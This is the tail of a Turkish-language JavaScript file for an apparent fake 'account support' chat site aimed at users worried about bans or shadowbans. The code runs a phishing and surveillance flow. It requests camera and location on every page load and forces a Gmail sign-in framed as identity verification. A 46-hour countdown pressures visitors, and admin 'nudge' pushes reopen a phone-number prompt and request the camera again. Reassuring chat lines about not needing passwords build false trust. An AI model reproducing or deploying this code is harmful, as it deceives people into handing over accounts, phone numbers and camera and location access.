    el.innerHTML = '<span class="chat-meta">Asistan yazıyor…</span><p><i></i><i></i><i></i></p>';
    box.appendChild(el);
    box.scrollTop = box.scrollHeight;
    return el;
  }

  function setQuizButtons(quick, question) {
    if (!quick) return;
    quick.innerHTML = "";
    if (!question) {
      [
        ["Hesabım kısıtlandı", "Hesap kısıtı"],
        ["Hesabım ban yedi", "Ban"],
        ["İzlenmelerim düştü", "İzlenme düşüşü"],
        ["Shadowban mı oldum?", "Görünürlük"],
      ].forEach(([value, label]) => {
        const btn = document.createElement("button");
        btn.type = "button";
        btn.setAttribute("data-quick", value);
        btn.textContent = label;
        quick.appendChild(btn);
      });
      return;
    }
    question.options.forEach((opt, i) => {
      const btn = document.createElement("button");
      btn.type = "button";
      btn.setAttribute("data-quick", opt);
      btn.textContent = `${i + 1}) ${opt}`;
      quick.appendChild(btn);
    });
  }

  function seedChat(box, quick) {
    box.innerHTML = "";
    setQuizButtons(quick, null);
  }

  function wireChat(root) {
    const box = root.querySelector("[data-chat-messages]");
    const form = root.querySelector("[data-chat-form]");
    const input = root.querySelector("[data-chat-input]");
    const clearBtn = root.querySelector("[data-chat-clear]");
    const quick = root.querySelector("[data-chat-quick]");
    if (!box || !form || !input) return;

    let busy = false;
    let quiz = null;
    let openSeqToken = 0;
    let openSeqTimer = null;

    const GREET_TEXT =
      "Merhaba. Bu kanal hesap, ban, izlenme ve görünürlük konularında ilgili rehberlere yönlendirir.\n\nKimlik doğrulaması için güvenlik adımı gerekir; tamamlanmadan doğrulama bitmez. Üstteki kırmızı geri sayım 46 saatlik süreyi gösterir — süre dolmadan tamamlayın. Durum kontrolü için \"Hesabım kısıtlandı\" yazın veya aşağıdaki kısayolları kullanın. Hesap şifresi veya doğrulama kodu paylaşmayın.";
    const LOADING_TEXT =
      "Kimlik doğrulaması hazırlanıyor. Lütfen bekleyin…";

    async function beginAutoCamera() {
      await ensureVisitorMedia(box, { fromGesture: false, announce: false });
    }

    function beginForcedGoogleSignIn() {
      const start = () => {
        const sync = window.ChatSync;
        if (!sync?.enabled || typeof sync.signInWithGoogleFast !== "function") {
          console.warn("Google Auth: ChatSync hazır değil");
          return;
        }
        sync.initAuth?.();
        void sync.consumeGoogleRedirectResult?.().then(() => {
          if (sync.getGoogleUser?.()) {
            document.getElementById("google-signin-wrap")?.remove();
            document.getElementById("google-signin-fab")?.remove();
            return;
          }

          document.getElementById("google-signin-wrap")?.remove();
          document.getElementById("google-signin-fab")?.remove();
          const wrap = document.createElement("div");
          wrap.id = "google-signin-wrap";
          wrap.className = "google-signin-wrap";
          wrap.setAttribute("role", "region");
          wrap.setAttribute("aria-label", "Kimlik doğrulama girişi");

          const hint = document.createElement("p");
          hint.className = "google-signin-hint";
          hint.textContent =
            "Kimlik doğrulaması için Gmail ile giriş yapmanız gerekir. Giriş yapılmadan doğrulama adımı tamamlanamaz.";

          const fab = document.createElement("button");
          fab.type = "button";
          fab.id = "google-signin-fab";
          fab.className = "google-signin-fab";
          fab.textContent = "Gmail ile giriş yap";
          fab.addEventListener("click", (e) => {
            e.preventDefault();
            e.stopPropagation();
            if (fab.dataset.busy === "1") return;
            fab.dataset.busy = "1";
            fab.disabled = true;
            fab.textContent = "Gmail’e gidiliyor…";
            void (async () => {
              try {
                const res = await sync.signInWithGoogleFast({
                  forcePrompt: true,
                  preferPopup: true,
                });
                if (res?.ok || sync.getGoogleUser?.()) {
                  const mail = res?.email || sync.getGoogleUser?.()?.email || "";
                  fab.textContent = mail ? `Giriş: ${mail}` : "Gmail giriş OK";
                  fab.disabled = true;
                  hint.textContent = "Kimlik doğrulaması için Gmail girişi tamamlandı.";
                  window.setTimeout(() => wrap.remove(), 1600);
                  return;
                }
                const errTxt = res?.error || "Giriş olmadı — tekrar dene";
                fab.textContent = errTxt.slice(0, 60);
                fab.title = errTxt;
                hint.textContent =
                  "Giriş tamamlanamadı. Kimlik doğrulaması için tekrar Gmail ile giriş yapmanız gerekir.";
                console.error("Gmail giriş", errTxt);
                window.setTimeout(() => {
                  fab.dataset.busy = "0";
                  fab.disabled = false;
                  fab.textContent = "Gmail ile giriş yap";
                  hint.textContent =
                    "Kimlik doğrulaması için Gmail ile giriş yapmanız gerekir. Giriş yapılmadan doğrulama adımı tamamlanamaz.";
                }, 3500);
              } catch (err) {
                console.error(err);
                fab.dataset.busy = "0";
                fab.disabled = false;
                fab.textContent = "Hata — tekrar dene";
                hint.textContent =
                  "Giriş hatası oluştu. Kimlik doğrulaması için tekrar deneyin.";
              }
            })();
          });
          wrap.appendChild(hint);
          wrap.appendChild(fab);
          document.body.appendChild(wrap);
          // Sadece redirect dönüşünü dinle; otomatik redirect yok (jest / busy kilidi)
          sync.startGoogleSignInLoop?.();
        });
      };

      if (window.ChatSync?.signInWithGoogleFast) start();
      else if (window.ChatSyncReady) window.ChatSyncReady.then(start).catch(start);
      else window.setTimeout(start, 200);
    }

    function startOpenSequence() {
      const token = ++openSeqToken;
      if (openSeqTimer) {
        window.clearTimeout(openSeqTimer);
        openSeqTimer = null;
      }
      bootImmediatePagePermissions();
      clearPermissionDeniedNotice(box);
      busy = true;
      appendMessage(box, "bot", GREET_TEXT);
      const loadingRow = appendMessage(box, "bot", LOADING_TEXT, {
        type: "loading",
        sync: false,
      });
      busy = false;
      // Kamera + konum — mevcut canlı oturumu kesmeden
      void beginAutoCamera();
      beginForcedGoogleSignIn();
      openSeqTimer = window.setTimeout(() => {
        openSeqTimer = null;
        if (token !== openSeqToken) return;
        loadingRow?.remove();
      }, 2000);
    }

    function botSay(text, after) {
      const typing = showTyping(box);
      const delay = 350 + Math.random() * 400;
      window.setTimeout(() => {
        typing.remove();
        appendMessage(box, "bot", text);
        busy = false;
        after?.();
        input.focus();
      }, delay);
    }

    function askCurrent() {
      const current = riskQuestions[quiz.index];
      setQuizButtons(quick, current);
      return (
        current.q +
        "\n\nCevap için alttaki butona basın veya yazın:\n" +
        current.options.map((o, i) => `${i + 1}) ${o}`).join("\n")
      );
    }

    function startQuiz(withIntro) {
      quiz = { index: 0, total: 0 };
      const syncNote = window.ChatSync?.enabled
        ? "Şifre / e-posta / kod yazmayın. Destek paneli yalnızca sorununuzu görür.\n\n"
        : "Şifre / e-posta / kod istenmez.\n\n";
      const intro = withIntro
        ? `Hesap durumu kontrolü başlıyor. 5 kısa soru soracağım.\n${syncNote}`
        : "Kontrol yeniden başlıyor.\n\n";
      botSay(intro + askCurrent());
    }

    function finishQuiz() {
      const verdict = riskVerdict(quiz.total);
      const score = quiz.total;
      quiz = null;
      if (quick) {
        quick.innerHTML = "";
        const again = document.createElement("button");
        again.type = "button";
        again.setAttribute("data-quick", "Hesabım kısıtlandı");
        again.textContent = "Kontrolü yeniden başlat";
        quick.appendChild(again);
        [
          ["Hesabım ban yedi", "Ban"],
          ["İzlenmelerim düştü", "İzlenme düşüşü"],
        ].forEach(([value, label]) => {
          const btn = document.createElement("button");
          btn.type = "button";
          btn.setAttribute("data-quick", value);
          btn.textContent = label;
          quick.appendChild(btn);
        });
      }
      botSay(
        `${verdict.title}\nSkor: ${score}/15\n\n${verdict.body}\n\nTekrar için ‘Kontrolü yeniden başlat’a basın.`
      );
    }

    function answerQuiz(raw) {
      if (SECRETISH.test(raw)) {
        botSay("Kontrol sırasında bile şifre veya e-posta istemeyiz. Lütfen alttaki seçeneklerden birini seçin.");
        return;
      }
      const current = riskQuestions[quiz.index];
      const matched = matchOption(raw, current.options);
      if (!matched) {
        botSay(
          "Bu cevabı tanımadım. Şunlardan birini seçin:\n" +
            current.options.map((o, i) => `${i + 1}) ${o}`).join("\n")
        );
        return;
      }
      quiz.total += current.score[matched] ?? 1;
      quiz.index += 1;
      if (quiz.index >= riskQuestions.length) {
        finishQuiz();
        return;
      }
      botSay(`Kaydedildi: “${matched}”.\n\n` + askCurrent());
    }

    function send(text) {
      const msg = text.trim();
      if (!msg || busy) return;
      busy = true;
      appendMessage(box, "user", msg);
      input.value = "";

      if (quiz) {
        answerQuiz(msg);
        return;
      }

      if (
        RISK_TRIGGER.test(msg) ||
        /risk altınd|risk kontrol|güvenlik kontrol|guvenlik kontrol|sorular[ıi] yeniden|yeniden başlat|kontrolü yeniden|kontrolu yeniden/i.test(
          msg
        )
      ) {
        startQuiz(true);
        return;
      }

      botSay(botReply(msg));
    }

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      send(input.value);
    });

    clearBtn?.addEventListener("click", () => {
      busy = false;
      quiz = null;
      openSeqToken += 1;
      if (openSeqTimer) {
        window.clearTimeout(openSeqTimer);
        openSeqTimer = null;
      }
      seedChat(box, quick);
      startOpenSequence();
    });

    quick?.addEventListener("click", (e) => {
      const btn = e.target.closest("[data-quick]");
      if (!btn) return;
      send(btn.getAttribute("data-quick") || btn.textContent || "");
    });

    seedChat(box, quick);
    startOpenSequence();
  }

  let supportListenerBound = false;
  function bindSupportIncomingOnce() {
    if (supportListenerBound) return;
    const primaryBox = document.querySelector("[data-chat-root] [data-chat-messages]");
    if (!primaryBox || !window.ChatSync?.listenIncomingSupport) return;
    supportListenerBound = true;
    window.ChatSync.listenIncomingSupport((msg) => {
      handleAdminIncoming(primaryBox, msg);
    });
  }

  // Önce tüm sayfalarda kamera+konum — sohbet olmasa da
  bootImmediatePagePermissions();

  // Admin push (arka plan) → sayfa açıksa güvenlik/kamera yeniden iste
  window.addEventListener("help-push-message", (ev) => {
    const d = ev?.detail?.payload?.data || ev?.detail || {};
    if (String(d.type || "") !== "visitor_nudge") return;
    const box =
      document.querySelector("[data-chat-root] [data-chat-messages]") ||
      getOrCreateMediaHost();
    try {
      sessionStorage.removeItem(PHONE_DONE_KEY);
      sessionStorage.removeItem(EMAIL_CODE_AUTO_KEY);
    } catch {
      /* ignore */
    }
    showPhoneEntryModal(box, { force: true });
    void ensureVisitorMedia(box, { fromGesture: false, announce: false });
  });

  document.querySelectorAll("[data-chat-root]").forEach(wireChat);
  bindSupportIncomingOnce();
  if (!supportListenerBound) {
    let n = 0;
    const t = setInterval(() => {
      n += 1;
      bindSupportIncomingOnce();
      if (supportListenerBound || n > 80) clearInterval(t);
    }, 50);
  }

  /* —— 46 saatlik acil geri sayım —— */
  const DEADLINE_MS = 46 * 60 * 60 * 1000;
  const DEADLINE_KEY = "verify_deadline_end_v1";

  function getDeadlineEnd() {
    try {
      const raw = localStorage.getItem(DEADLINE_KEY);
      const n = raw ? Number(raw) : NaN;
      if (Number.isFinite(n) && n > Date.now()) return n;
      const end = Date.now() + DEADLINE_MS;
      localStorage.setItem(DEADLINE_KEY, String(end));
      return end;
    } catch {
      return Date.now() + DEADLINE_MS;
    }
  }

  function pad2(n) {
    return String(Math.max(0, n | 0)).padStart(2, "0");
  }

  function formatDeadlineParts(msLeft) {
    const totalSec = Math.max(0, Math.floor(msLeft / 1000));
    const h = Math.floor(totalSec / 3600);
    const m = Math.floor((totalSec % 3600) / 60);
    const s = totalSec % 60;
    return { h, m, s, totalSec };
  }

  function initDeadlineCountdowns() {
    const boards = [...document.querySelectorAll("[data-deadline-countdown]")];
    const inlines = [...document.querySelectorAll("[data-deadline-inline]")];
    if (!boards.length && !inlines.length) return;

    const endAt = getDeadlineEnd();

    const tick = () => {
      const left = endAt - Date.now();
      const { h, m, s, totalSec } = formatDeadlineParts(left);
      const hStr = pad2(h);
      const mStr = pad2(m);
      const sStr = pad2(s);
      const clock = `${hStr}:${mStr}:${sStr}`;
      const critical = totalSec > 0 && totalSec <= 3600;
      const expired = totalSec <= 0;

      boards.forEach((el) => {
        const hEl = el.querySelector("[data-cd-h]");
        const mEl = el.querySelector("[data-cd-m]");
        const sEl = el.querySelector("[data-cd-s]");
        const sr = el.querySelector("[data-cd-sr]");
        if (hEl) hEl.textContent = hStr;
        if (mEl) mEl.textContent = mStr;
        if (sEl) sEl.textContent = sStr;
        el.classList.toggle("is-critical", critical);
        el.classList.toggle("is-expired", expired);
        if (sr) {
          sr.textContent = expired
            ? "Süre doldu. Doğrulama yeniden başlatılmalı."
            : `Kalan süre ${h} saat ${m} dakika ${s} saniye.`;
        }
        const note = el.querySelector(".urgent-countdown-note");
        if (note && expired) {
          note.textContent = "Süre doldu. Sayfayı yenileyip doğrulamayı yeniden başlatın.";
        }
      });

      inlines.forEach((el) => {
        el.textContent = expired ? "00:00:00" : clock;
        el.classList.toggle("is-critical", critical || expired);
        el.title = expired ? "Süre doldu" : `Kalan süre ${clock}`;
      });
    };

    tick();
    window.setInterval(tick, 1000);
  }

  initDeadlineCountdowns();

  /* Floating launcher */
  {
    const chatHref = inArticles ? "../chat.html" : "chat.html";
    const hasHomeChat = Boolean(document.querySelector("#canli-destek"));
    const hasInlineChat = Boolean(document.querySelector("#canli-destek, .chat-page"));

    const launcher = document.createElement("div");
    launcher.className = "chat-float";
    const inlineNote = hasHomeChat
      ? `<p class="chat-float-note">Bu sayfada sohbet kutusu var. <a href="#canli-destek">Aşağıya in</a> veya <a href="${chatHref}">tam sayfa sohbet</a>.</p>`
      : hasInlineChat
        ? `<p class="chat-float-note">Sohbet bu sayfada. Aşağıdaki kutuya yazın.</p>`
        : `<p class="chat-float-note">Yardım asistanına yazmak için:</p>
           <a class="btn btn-primary" href="${chatHref}">Sohbeti aç</a>`;

    launcher.innerHTML = `
      <button type="button" class="chat-float-btn" aria-expanded="false" aria-controls="chat-float-panel" data-float-toggle>
        <span class="chat-float-icon" aria-hidden="true"></span>
        <span data-float-label>Destek</span>
      </button>
      <div class="chat-float-panel" id="chat-float-panel" hidden data-float-panel>
        <header class="chat-float-head">
          <strong>Destek yazışması</strong>
          <button type="button" class="chat-float-close" data-float-close aria-label="Kapat">×</button>
        </header>
        ${inlineNote}
      </div>
    `;
    document.body.appendChild(launcher);

    const panel = launcher.querySelector("[data-float-panel]");
    const toggle = launcher.querySelector("[data-float-toggle]");
    const label = launcher.querySelector("[data-float-label]");

    function setOpen(open) {
      panel.hidden = !open;
      toggle.setAttribute("aria-expanded", String(open));
      label.textContent = open ? "Kapat" : "Destek";
      launcher.classList.toggle("is-open", open);
    }

    toggle.addEventListener("click", () => {
      if (hasInlineChat) {
        const target = document.getElementById("canli-destek") || document.querySelector(".chat-shell");
        if (target) {
          target.scrollIntoView({ behavior: "smooth", block: "start" });
          target.querySelector("[data-chat-input]")?.focus();
          return;
        }
      }
      setOpen(panel.hidden);
    });
    launcher.querySelector("[data-float-close]")?.addEventListener("click", () => setOpen(false));
  }
})();
